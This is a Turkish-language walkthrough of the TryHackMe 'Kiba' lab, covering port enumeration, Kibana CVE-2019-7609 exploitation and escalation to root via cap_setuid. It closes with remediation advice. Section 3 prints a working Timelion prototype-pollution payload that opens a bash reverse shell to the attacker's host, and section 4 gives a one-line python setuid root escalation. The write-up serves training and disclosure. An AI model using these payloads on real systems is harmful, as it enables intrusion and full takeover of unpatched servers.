# Kiba — TryHackMe

**Platform:** TryHackMe
**Zorluk:** Kolay (Easy)
**İşletim Sistemi:** Linux
**Tarih:** 25.10.2026

> Block 1 çıkış sınavı — tek başına çözüldü. Saldırı zinciri: Kibana 6.5.4 RCE (CVE-2019-7609) → `kiba` kullanıcısı → `cap_setuid` capability → root.

---

## 1. Özet

Hedef, standart dışı bir portta açık bir **Kibana 6.5.4** örneği barındırmaktadır. Bu sürüm, Timelion bileşenindeki prototype pollution zafiyetine (**CVE-2019-7609**) karşı savunmasızdır ve uzaktan kod çalıştırmaya (RCE) izin verir. `kiba` kullanıcısı olarak shell alındıktan sonra, gizli bir `python3` binary'sindeki yanlış yapılandırılmış Linux capability'si (`cap_setuid`) istismar edilerek root yetkisine yükselinmiştir.

| Aşama | Sonuç |
|---|---|
| İlk erişim | Kibana 6.5.4 RCE (CVE-2019-7609) → `kiba` |
| Yetki yükseltme | `cap_setuid` capability → `root` |
| Bayraklar | `user.txt`, `root.txt` |

---

## 2. Keşif (Enumeration)

### 2.1 İlk tarama

```bash
nmap -sV -sC <HEDEF_IP>
```

| Port | Servis |
|---|---|
| 22/tcp | OpenSSH |
| 80/tcp | HTTP |

### 2.2 Çıkmaz sokaklar

- **Port 80:** `gobuster` ile dizin taraması yapıldı, anlamlı sonuç çıkmadı.
- **Port 22:** `kali` kullanıcı adı kabul ediliyordu (parola soruyordu) ama geçerli kimlik bilgisi yoktu.

### 2.3 Tam port taraması — kırılma noktası

Top-1000 taraması asıl saldırı yüzeyini kaçırdı. Tüm 65535 port tarandı:

```bash
nmap -p- -sV <HEDEF_IP>
```

Bu tarama, standart taramada **görünmeyen** portu ortaya çıkardı:

| Port | Servis |
|---|---|
| 5601/tcp | Kibana |

> **Çıkarım:** 5601 portu top-1000 aralığının dışında olduğu için standart tarama göstermedi. `-p-` olmadan bu makine çözülemez. Tam port taraması artık standart ilk adım.

### 2.4 Servis tespiti

5601'deki web arayüzü **Kibana 6.5.4** sürümünü açığa çıkardı. Bu sürüm **CVE-2019-7609** (Kibana Timelion prototype pollution → RCE) ile eşleşti.

---

## 3. İstismar — İlk Erişim

### 3.1 Dinleyici

```bash
nc -lvnp 4444
```

### 3.2 Payload

Kibana → Timelion arayüzünde çalıştırıldı:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<TUN0_IP>/4444 0>&1\'");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### 3.3 Payload nasıl çalışıyor

| Parça | İşlevi |
|---|---|
| `.props(label.__proto__.env.AAAA=...)` | `__proto__` üzerinden tüm nesnelerin `env` objesine `AAAA` değişkeni enjekte edilir (prototype pollution). İçinde reverse shell kodu vardır. |
| `require("child_process").exec(...)` | Enjekte edilen değişken bash reverse shell komutunu taşır. |
| `NODE_OPTIONS='--require /proc/self/environ'` | Node.js her yeni process'te `/proc/self/environ` dosyasını JS modülü gibi `require` eder. O dosya ortam değişkenlerini (yani `AAAA` içindeki shell kodunu) barındırdığından Node onu çalıştırır → **RCE**. |

### 3.4 kiba shell'i

```bash
id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

### 3.5 User bayrağı

```bash
cat /home/kiba/user.txt
THM{[REDACTED]}
```

---

## 4. Yetki Yükseltme (Privilege Escalation)

### 4.1 SUID taraması — sonuçsuz

```bash
find / -perm -4000 -type f 2>/dev/null
```

Yalnızca standart sistem binary'leri (`sudo`, `passwd`, `mount`, …) — istismara uygun değil.

### 4.2 Capability taraması — kırılma noktası

```bash
getcap -r / 2>/dev/null
```

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

Gizli bir dizindeki özel `python3`, `cap_setuid` capability'sine sahip. Bu, process'in kendi UID'sini herhangi bir değere — 0 (root) dahil — ayarlamasına izin verir.

### 4.3 İstismar

```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
uid=0(root) gid=1000(kiba) ...
```

> **Mekanizma:** `cap_setuid` sayesinde `os.setuid(0)` sudo/parola olmadan başarılı olur. Açılan `/bin/bash` root yetkisiyle çalışır — SUID binary ile aynı sonuç, capability üzerinden.

### 4.4 Root bayrağı

```bash
cat /root/root.txt
THM{[REDACTED]}
```

---

## 5. Bulgular ve Öneriler

| # | Bulgu | Önem | Öneri |
|---|---|---|---|
| 1 | Kibana 6.5.4 — CVE-2019-7609 RCE | **Kritik** | Yamalı sürüme güncelleyin; Kibana'yı internete kapatın, ters proxy + kimlik doğrulama arkasına alın. |
| 2 | `cap_setuid` yetkili yazılabilir binary | **Kritik** | Gereksiz capability'leri kaldırın (`setcap -r`); kullanıcı dizinlerinde yetkili binary bulundurmayın. |
| 3 | Standart dışı portta servis (5601) | Bilgi | Saldırı yüzeyini envanterleyin; kullanılmayan servisleri kapatın. |

---

## 6. Öğrenilen Dersler

1. **`-p-` standart adımdır.** Hedef port (5601) top-1000 dışındaydı; tam tarama olmadan makine çözülemez.
2. **İlk çıkmaz sokaklar (22/80) yanıltıcı olabilir.** Asıl saldırı yüzeyi her zaman ilk görünen portlarda değil.
3. **SUID tek privesc yolu değil.** SUID taraması boş çıkınca `getcap` mutlaka kontrol edilmeli — bu sefer ikisi birlikte çalıştırıldı ve giriş yolu capability vektörüydü.
